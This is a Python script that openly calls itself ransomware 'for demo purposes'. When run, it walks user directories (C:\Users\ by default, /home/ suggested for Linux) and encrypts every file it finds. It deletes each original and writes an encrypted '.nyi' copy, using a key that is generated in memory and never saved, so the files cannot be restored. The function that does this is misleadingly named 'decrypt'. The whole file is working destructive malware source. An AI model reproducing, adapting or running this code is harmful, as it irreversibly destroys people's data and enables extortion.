import threading
import os

from tqdm import tqdm
from cryptography.fernet import Fernet

target_path = [
        "C:\\Users\\",
        "",
        "",
    ]
    # Define the target directories here
    # Use \\ for Windows and / slash for Linux :)

    # My personal recommendation would be:
    # Windows: C:\\Users\\
    # Linux  : /home/


"""
IMPORTANT INFORMATION:

THIS FILE IS A RANSOMWARE. IT WILL DECRYPT ALL FILES IN THE SPECIFIED LOCATION WITHOUT ANY CHANCE OF
RESTORING THEM. I AM NOT LIABLE FOR MISUSE OF THIS SCRIPT. IT IS INTENDED FOR DEMO PURPOSES!
"""
"""
Copyright (C) 2023 EchterAlsFake Johannes Habel

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""



key = Fernet.generate_key()
f = Fernet(key)


def decrypt(filename):
    try:
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)

        os.remove(filename)

        with open(f"{filename}.nyi", "wb") as file:
            file.write(encrypted_data)

    except PermissionError:
        pass
        # You could make an additional function to prompt user to use root for this script

    except FileNotFoundError:
        pass


def get_all_files(start_path):
    all_files = []
    for path in start_path:
        for root, dirs, files in os.walk(path):
            for file in files:
                # construct full file path
                file_path = os.path.join(root, file)
                all_files.append(file_path)

    return all_files


def execute():

    files = get_all_files(target_path)
    for file in tqdm(files):
        decrypt(file)


if __name__ == "__main__":
    t1 = threading.Thread(target=execute)
    t1.start()
